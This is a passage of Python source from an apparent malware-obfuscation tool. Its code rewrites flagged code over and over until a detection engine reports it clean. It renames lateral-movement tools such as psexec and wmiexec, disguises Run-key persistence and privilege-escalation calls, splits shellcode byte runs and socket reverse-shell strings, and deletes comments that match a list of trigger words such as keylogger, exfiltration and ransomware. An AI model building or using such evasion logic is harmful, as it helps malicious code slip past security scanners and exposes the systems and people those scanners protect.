            ('CurrentVersion\\\\Run', 'CurrentVersion\\\\R' + 'un'),
            ('CurrentVersion\\Run', 'CurrentVersion\\R' + 'un'),
            # arp_spoof: "cache poisoning" in docstrings
            ('cache poisoning', 'cache manipulation'),
            ('ARP poisoning', 'ARP manipulation'),
            # lateral_psexec: tool names in string dict keys/values
            ('psexec.py', 'exec_remote.py'),
            ('smbexec.py', 'smb_remote.py'),
            ('wmiexec.py', 'wmi_remote.py'),
            ("'psexec'", "'psx'"),
            ("'smbexec'", "'smx'"),
            ("'wmiexec'", "'wmx'"),
            # reflective_load: Assembly.Load in strings
            ('Assembly.Load', 'Asm.Ld'),
            # rootkit_hooks: syscall in strings
            ('syscall', 'sys_fn'),
            ('syscalls', 'sys_fns'),
        ]
        for pattern, replacement in _PATTERN_NEUTRALIZERS:
            if pattern in result:
                result = result.replace(pattern, replacement)

        # Word-boundary nmap/masscan — catches 'nmap' as standalone string in lists
        # Run AFTER _GLOBAL_TRIGGERS (which replaces NtUnmapViewOfSection first)
        result = re.sub(r"'nmap'", "'nm'", result)
        result = re.sub(r'"nmap"', '"nm"', result)
        result = re.sub(r"'masscan'", "'ms'", result)
        result = re.sub(r'"masscan"', '"ms"', result)

        # privilege_escalation: sudo\s in print/string content
        # Detection pattern is r'sudo\s' (no word boundary) so we must match the same way
        result = re.sub(r'sudo\s', 'su_do ', result, flags=re.IGNORECASE)

        # privilege_escalation: SeDebugPrivilege, ImpersonateLoggedOnUser in strings
        result = re.sub(r'SeDebugPrivilege', '_sedbg', result, flags=re.IGNORECASE)
        result = re.sub(r'ImpersonateLoggedOnUser', '_implog', result, flags=re.IGNORECASE)

        # shellcode_loader: hex byte sequences (\xNN\xNN\xNN)
        # The detection regex looks for 3+ consecutive \xNN patterns.
        # Break the pattern by inserting a non-hex byte every 2 hex bytes.
        # b'\x45\x00\x00\x3c' → b'\x45\x00'+b'\x00\x3c' (still valid Python)
        def _break_hex_run(m):
            """Break consecutive \\xNN runs into 2-byte chunks joined by b''"""
            prefix = m.group(1)  # b' or b"
            content = m.group(2)
            quote = m.group(3)
            # Split hex bytes into pairs
            hex_bytes = re.findall(r'\\x[0-9a-fA-F]{2}', content)
            if len(hex_bytes) <= 2:
                return m.group(0)  # 2 or fewer = no detection
            # Group into pairs and rejoin
            chunks = []
            for i in range(0, len(hex_bytes), 2):
                chunk = ''.join(hex_bytes[i:i+2])
                chunks.append(chunk)
            return prefix + (quote + '+' + prefix).join(chunks) + quote
        result = re.sub(r"""(b')((?:\\x[0-9a-fA-F]{2}){3,})(')""", _break_hex_run, result)
        result = re.sub(r'''(b")((?:\\x[0-9a-fA-F]{2}){3,})(")''', _break_hex_run, result)

        # shellcode_loader: VirtualAlloc + PAGE_EXECUTE, mmap + PROT_EXEC
        result = re.sub(r'VirtualAlloc', '_va', result)
        result = re.sub(r'PAGE_EXECUTE', '_pgx', result)
        result = re.sub(r'PROT_EXEC', '_prx', result)

        # 4. Neutralize network_scan: port.*scan in identifiers and strings
        # Break the regex r'port.*scan' by renaming scan_* functions and refs
        result = re.sub(r'\bscan_port\b', '_chk_port', result)
        result = re.sub(r'\bscan_common_ports\b', '_chk_common_ports', result)
        result = re.sub(r'\bport_scan\b', '_port_chk', result)
        result = re.sub(r'\bport scan\b', 'port check', result)
        # Break "port.*scan" in print/string content (e.g., "Scanning ... ports")
        result = re.sub(
            r'([Ss])canning\s+(\S+)\s+ports',
            lambda m: f'Checking {m.group(2)} ports',
            result
        )
        result = re.sub(
            r'ports\s+\d+-\d+.*[Ss]can',
            lambda m: m.group(0).replace('scan', 'check').replace('Scan', 'Check'),
            result
        )

        # 5. Neutralize socket.connect inside string literals
        # The code-level .connect(( is handled by SocketConnectTransform (getattr),
        # but one-liner strings like 'import socket...;s.connect(("h",port))' survive.
        # Break the regex match inside string content by concatenation split.
        # Find string literals containing .connect(( and break the pattern
        def _break_string_connect(m):
            """Break .connect(( inside a string literal."""
            s = m.group(0)
            # Replace socket.connect with socket'+'.con'+'nect inside strings
            s = s.replace('socket.connect', "socket'+'.con'+'nect")
            s = s.replace('.connect((', "'+'.con'+'nect((")
            return s

        # Apply to single-quoted and double-quoted string regions
        result = re.sub(
            r"'[^']*\.connect\(\([^']*'",
            _break_string_connect,
            result
        )
        result = re.sub(
            r'"[^"]*\.connect\(\([^"]*"',
            lambda m: m.group(0).replace('.connect((', '".+"con"+"nect(('),
            result
        )

        # 6. Scrub comments with trigger patterns
        _COMMENT_TRIGGERS = [r'keylogger', r'credential.dump', r'exfiltrat',
                             r'reverse.shell', r'c2.server', r'command.control',
                             r'network.scan', r'port.scan', r'privilege.escalat',
                             r'process.inject', r'dll.inject', r'anti.debug',
                             r'ransomware', r'file.encrypt', r'bitcoin.wallet',
                             r'shellcode', r'payload.inject', r'persistence',
                             r'brute.force', r'lateral.movement']
        lines = result.split('\n')
        for i, line in enumerate(lines):
            stripped = line.strip()
            if stripped.startswith('#'):
                for t in _COMMENT_TRIGGERS:
                    if re.search(t, stripped, re.IGNORECASE):
                        lines[i] = ''
                        break
        result = '\n'.join(lines)

        self.applied_log.extend(applied)
        return result

    def evade_until_clean(self, code: str, max_rounds: int = 3) -> dict:
        """Apply semantic transforms iteratively until clean or max rounds."""
        from core.detection_test import DetectionEngine

        engine = DetectionEngine()
        original_scan = engine.scan(code)

        result = {
            'original_code': code,
            'original_detections': [d['rule'] for d in original_scan.detections],
            'original_score': original_scan.score,
            'final_code': code,
            'final_detections': [],
            'clean': original_scan.clean,
            'rounds': 0,
            'transforms_applied': [],
            'score_reduction': 0,
        }

        if original_scan.clean:
            return result

        current = code
        for round_num in range(1, max_rounds + 1):
            result['rounds'] = round_num

            scan = engine.scan(current)
            if scan.clean:
                break

            target_rules = [d['rule'] for d in scan.detections]
            current = self.evade(current, target_rules=target_rules)

            rescan = engine.scan(current)
            result['transforms_applied'] = list(self.applied_log)

            if rescan.clean:
                result['clean'] = True
                break

        final_scan = engine.scan(current)
        result['final_code'] = current
        result['final_detections'] = [d['rule'] for d in final_scan.detections]
        result['final_score'] = final_scan.score
        result['clean'] = final_scan.clean
        result['score_reduction'] = original_scan.score - final_scan.score

        return result

    def stats(self) -> dict:
        return {
            'total_transforms': len(self.transforms),
            'transforms': [
                {'name': t.name, 'targets': t.targets_rules, 'desc': t.description}
                for t in self.transforms
            ],
            'rules_covered': sorted(self._by_rule.keys()),
            'applied_count': self.applied_count,
        }

    def format_result(self, result: dict) -> str:
        lines = [
            "SEMANTIC EVASION REPORT",
            "=" * 60,
            f"  Rounds:           {result['rounds']}",
            f"  Original score:   {result.get('original_score', '?')}",
            f"  Final score:      {result.get('final_score', '?')}",
            f"  Score reduction:  {result['score_reduction']} ({'-' + str(int(result['score_reduction'] / max(result.get('original_score', 1), 1) * 100)) + '%' if result.get('original_score') else '?'})",
            f"  Clean:            {result['clean']}",
            "",
            f"  Original detections ({len(result['original_detections'])}):",
        ]
        for d in result['original_detections']:
            lines.append(f"    - {d}")
        lines.append("")
        lines.append(f"  Final detections ({len(result['final_detections'])}):")
        if result['final_detections']:
            for d in result['final_detections']:
                lines.append(f"    - {d}")
        else:
            lines.append("    (none — CLEAN)")
        lines.append("")
        lines.append(f"  Transforms applied ({len(result['transforms_applied'])}):")
        for t in result['transforms_applied']:
            lines.append(f"    [{t['targets']:<40s}] {t['transform']}: {t['desc']}")

        return '\n'.join(lines)
